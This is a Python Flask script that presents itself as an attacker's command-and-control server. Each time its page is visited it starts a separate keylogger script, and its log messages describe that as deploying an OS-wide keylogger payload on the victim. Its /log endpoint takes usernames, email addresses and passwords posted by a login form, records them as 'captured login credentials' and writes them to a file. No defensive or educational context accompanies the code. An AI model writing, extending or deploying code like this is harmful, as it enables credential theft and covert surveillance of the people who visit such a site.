import os
import subprocess
import sys
from flask import Flask, jsonify, render_template, request
from flask_cors import CORS

# Initialize Flask app
app = Flask(__name__, template_folder='.')
CORS(app)

keylogger_process = None


@app.route('/')
def serve_website():
  global keylogger_process

  # Automatically trigger the system keylogger payload when the site is opened
  if keylogger_process is None or keylogger_process.poll() is not None:
    try:
      # Use sys.executable to ensure it runs in the exact same Python environment
      keylogger_process = subprocess.Popen(
          [sys.executable, 'keylogger_agent.py']
      )
      print(
          '\n[!] EXPLOIT TRIGGERED: Victim visited the site!'
          '\n[+] System-level keylogger payload successfully deployed OS-wide!\n'
      )
    except Exception as e:
      print(f'[-] Payload deployment failed: {e}')

  return render_template('index.html')


@app.route('/log', methods=['POST'])
def receive_credentials():
  data = request.json
  username = data.get('username')
  email = data.get('email')
  password = data.get('password')

  log_entry = (
      '----------------------------------------\n'
      f'[!] CAPTURED LOGIN CREDENTIALS:\n'
      f'    Full Name/User: {username}\n'
      f'    Email Address:  {email}\n'
      f'    Password:       {password}\n'
      '----------------------------------------\n'
  )

  with open('captured_keystrokes.txt', 'a', encoding='utf-8') as f:
    f.write(log_entry)

  print(f'[+] Form Hijack Successful -> User: {username} | Email: {email}')
  return jsonify({'status': 'logged'}), 200


if __name__ == '__main__':
  print(
      '[*] C2 Attacker Server & Payload Distributor running on'
      ' http://localhost:5000'
  )
  print(
      '[*] Waiting for victim to visit the website to deploy system'
      ' payload...'
  )
  app.run(host='127.0.0.1', port=5000)